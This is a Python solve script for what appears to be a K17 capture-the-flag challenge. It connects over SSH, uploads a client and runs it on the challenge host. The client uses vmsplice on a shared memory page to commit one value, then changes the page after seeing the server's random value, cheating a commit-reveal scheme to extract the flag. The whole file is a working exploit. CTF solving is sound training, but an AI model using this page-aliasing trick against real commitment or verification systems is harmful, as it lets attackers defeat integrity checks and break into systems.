import json
import os
import re
import secrets
import sys
import textwrap
from pathlib import Path

import paramiko


ROOT = Path(__file__).resolve().parent
FLAG_PATTERN = re.compile(rb"K17\{[^\r\n}]*\}")

CLIENT_SOURCE = textwrap.dedent(
    r"""
    import ctypes
    import hashlib
    import mmap
    import os
    import time

    READ_FD = 3
    WRITE_FD = 4
    COMMIT_HEX_LENGTH = 64


    class IOVec(ctypes.Structure):
        _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]


    libc = ctypes.CDLL(None, use_errno=True)
    libc.vmsplice.argtypes = [
        ctypes.c_int,
        ctypes.POINTER(IOVec),
        ctypes.c_ulong,
        ctypes.c_uint,
    ]
    libc.vmsplice.restype = ctypes.c_ssize_t

    page = mmap.mmap(-1, mmap.PAGESIZE, flags=mmap.MAP_SHARED)
    page[:COMMIT_HEX_LENGTH] = b"0" * COMMIT_HEX_LENGTH
    page_buffer = (ctypes.c_char * mmap.PAGESIZE).from_buffer(page)
    iovec = IOVec(ctypes.addressof(page_buffer), COMMIT_HEX_LENGTH)

    written = libc.vmsplice(WRITE_FD, ctypes.byref(iovec), 1, 0)
    if written != COMMIT_HEX_LENGTH:
        errno = ctypes.get_errno()
        raise OSError(errno, os.strerror(errno))

    with os.fdopen(READ_FD, "rb", buffering=0, closefd=False) as reader:
        r2 = bytes.fromhex(reader.readline().decode("ascii").strip())

    r1 = (int.from_bytes(r2, "big") ^ 67).to_bytes(16, "big")
    reveal = r1 + bytes(16)
    page[:COMMIT_HEX_LENGTH] = hashlib.sha256(reveal).hexdigest().encode("ascii")

    reveal_hex = reveal.hex().encode("ascii")
    if os.write(WRITE_FD, reveal_hex) != len(reveal_hex):
        raise RuntimeError("short write")

    time.sleep(0.5)
    """
).lstrip()


def load_endpoint(name: str) -> dict:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in data["endpoints"] if item["name"] == name)
    for field in ("password_env", "token_env", "key_file_env"):
        if field in endpoint:
            endpoint[field.removesuffix("_env")] = os.environ[endpoint[field]]
    return endpoint


def run() -> bytes:
    endpoint = load_endpoint("main")
    if endpoint["protocol"] != "ssh":
        raise ValueError("main endpoint must use SSH")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    remote_path = f"/tmp/spot-{secrets.token_hex(12)}.py"
    sftp = None

    try:
        client.connect(
            hostname=endpoint["host"],
            port=endpoint["port"],
            username=endpoint["username"],
            password=endpoint["password"],
            allow_agent=False,
            look_for_keys=False,
            timeout=15,
            auth_timeout=15,
            banner_timeout=15,
        )
        sftp = client.open_sftp()
        with sftp.file(remote_path, "w") as remote_file:
            remote_file.write(CLIENT_SOURCE)
        sftp.chmod(remote_path, 0o600)

        _, stdout, stderr = client.exec_command(
            f"/home/ctf/runner {remote_path}", timeout=45
        )
        output = stdout.read()
        error = stderr.read()
        status = stdout.channel.recv_exit_status()
        if status != 0:
            detail = error.decode("utf-8", errors="replace").strip()
            raise RuntimeError(f"remote runner failed with status {status}: {detail}")
    finally:
        if sftp is not None:
            try:
                sftp.remove(remote_path)
            except OSError:
                pass
            sftp.close()
        client.close()

    match = FLAG_PATTERN.search(output)
    if match is None:
        raise RuntimeError("remote runner output did not contain a flag")
    return match.group(0)


def main() -> int:
    try:
        flag = run()
    except Exception as exc:
        print(f"solve failed: {exc}", file=sys.stderr)
        return 1
    sys.stdout.buffer.write(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
